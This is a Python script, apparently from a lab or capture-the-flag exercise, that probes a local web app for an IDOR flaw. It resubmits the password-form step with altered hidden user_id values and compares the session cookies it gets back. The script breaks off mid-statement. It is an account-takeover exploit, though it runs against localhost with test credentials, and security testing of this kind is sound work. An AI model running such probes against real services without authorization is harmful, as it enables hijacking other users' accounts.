import requests
import re

base_url = "http://127.0.0.1:32933"

print("[+] Final comprehensive IDOR testing...")
print("=" * 60)

# The key insight: We need to get a valid session first, then test IDOR
# Login flow:
# 1. POST / (no cookies) -> username=test -> 302 to /password/test
# 2. GET /password/test -> shows form with username=user_id
# 3. POST /password/test -> username=test,user_id=10032,password=test -> 302 with session

# Step 1: Start authentication flow
print("\n[+] Step 1: POST / with username=test")
step1 = requests.post(base_url + "/", data={'username': 'test'}, allow_redirects=False)
print(f"    Status: {step1.status_code}, Location: {step1.headers.get('Location')}")

# Step 2: Get password form
if step1.status_code == 302:
    redirect_url = step1.headers.get('Location')
    print(f"\n[+] Step 2: GET {redirect_url}")
    step2 = requests.get(base_url + redirect_url, allow_redirects=False)
    print(f"    Status: {step2.status_code}")
    
    # Extract user_id from form
    uid = re.findall(r'name="user_id".*?value="(\d+)"', step2.text)
    print(f"    User ID in form: {uid}")
    
    # Step 3: Now test IDOR - POST with different user_id but same username
    print("\n[+] Step 3: Testing IDOR with modified user_id in POST...")
    if uid:
        original_uid = uid[0]
        
        # Function to attempt login and get result
        def try_login(user_id):
            data = {
                'username': 'test',
                'user_id': str(user_id),
                'password': 'test'
            }
            resp = requests.post(base_url + redirect_url, data=data, allow_redirects=True)
            # Check if we got a session cookie
            session = resp.cookies.get('session')
            return session, len(resp.history), resp.url, resp.text
        
        # Test with original user_id
        print("\n[+] Baseline (user_id=10032):")
        session_10032, redirects_10032, final_url_10032, text_10032 = try_login(10032)
        print(f"    Session: {session_10032}")
        print(f"    Redirects: {redirects_10032}")
        print(f"    Final URL: {final_url_10032}")
        
        # Test with different user_ids
        for test_uid in [10031, 10033, 10034, 1, 9999]:
            print(f"\n[+] Testing user_id={test_uid}:")
            session_test, redirects_test, final_url_test, text_test = try_login(test_uid)
            print(f"    Session: {session_test}")
            print(f"    Redirects: {redirects_test}")
            print(f"    Final URL: {final_url_test}")
            
            # Check for differences
            if session_test != session_10032:
                print(f"    [!] Different session cookie!")
            if final_url_test != final_url_10032:
